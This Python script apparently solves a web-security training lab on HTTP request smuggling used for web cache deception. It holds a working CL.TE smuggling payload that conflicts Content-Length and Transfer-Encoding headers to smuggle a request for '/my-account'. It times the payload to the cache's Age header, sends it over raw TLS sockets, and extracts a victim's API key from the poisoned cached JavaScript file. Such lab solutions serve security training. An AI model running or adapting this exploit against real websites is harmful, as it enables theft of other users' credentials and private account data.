import sys
import requests
import ssl
import socket
import urllib3
import re
import time

# Disable SSL warnings for unverified requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Lab: Exploiting HTTP request smuggling to perform web cache deception

# Extract the API key from the response text using regex
def Extarct_API_KEY(API_KEY_TEXT):
    # Look for the text "Your API Key is" and extract the key
    API = re.search(r"Your API Key is:(.*)", API_KEY_TEXT).group(1).split("<")[0]
    return API

# Perform the CL.TE cache deception attack
def CL_TE_CACHE_DECPTION(target_host, target_port):
    # The payload exploits a CL.TE vulnerability:
    # - The front-end uses the Content-Length (CL) header.
    # - The back-end processes the Transfer-Encoding (TE) header.
    payload = (
        "POST / HTTP/1.1\r\n"  # POST request to start the smuggling
        f"Host: {target_host}\r\n"  # Specify the target host
        "Content-Type: application/x-www-form-urlencoded\r\n"  # Standard form data
        "Content-Length: 42\r\n"  # Front-end processes this as 42 bytes
        "Transfer-Encoding: chunked\r\n"  # Back-end processes this header
        "\r\n"
        "0\r\n"  # End of chunked body for the back-end
        "\r\n"
        "GET /my-account HTTP/1.1\r\n"  # Smuggled request to retrieve the victim's API key
        "X-Ignore: x"  # Extra header to prevent parsing issues
    )
    
    while True:  # Keep trying until the attack succeeds
        # Monitor the age of the cached response
        counter = 0
        while counter != 27:  # Wait until the cache is about to expire
            response = requests.get(
                "https://" + target_host + "/resources/js/tracking.js",  verify=False,  allow_redirects=False
            )
            counter = int(response.headers['age'])  # Extract the Age header
        
        # Send the payload multiple times to ensure synchronization
        for i in range(1, 7):
            ssl_context = ssl.create_default_context()
            with socket.create_connection((target_host, target_port)) as sock:
                with ssl_context.wrap_socket(sock, server_hostname=target_host) as securesock:
                    print(f"({i})-Payload sent.")  # Log payload delivery
                    securesock.sendall(payload.encode())  # Send the crafted payload
                    response_smuggled = securesock.recv(4096)  # Receive server response
                    
                    if "504 Gateway Timeout" in response_smuggled.decode():
                        print("(-) No response received (504 Gateway Timeout).")
                        sys.exit(1)  # Exit if the server times out

        # Check the cached response for the API key
        response_check = requests.get(
            "https://" + target_host + "/resources/js/tracking.js", 
            verify=False
        )
        if "Your API Key is" in response_check.text:  # Look for the API key in the response
            print('(+) API Key Found.')
            API_KEY = Extarct_API_KEY(response_check.text)  # Extract the API key
            print("(+) Submitting the API KEY...")
            data = {"answer": API_KEY.strip()}
            response_submit = requests.post(
                "https://" + target_host + "/submitSolution", 
                verify=False, 
                data=data
            )
            if "true" in response_submit.text:  # Check if the lab is solved
                print('(+) Lab solved.')
                exit()
        else:
            print('(-) API key not found yet.')
            time.sleep(4)  # Wait a bit before retrying

# Main function to handle command-line arguments and start the attack
def main():
    if len(sys.argv) != 2:  # Check for correct usage
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net" % sys.argv[0])
        sys.exit(1)  # Exit if arguments are incorrect
    target_host = sys.argv[1]
    target_port = 443  # Use HTTPS port
    print('(+) Starting ......')
    CL_TE_CACHE_DECPTION(target_host, target_port)

# Entry point of the script
if __name__ == "__main__":
    main()
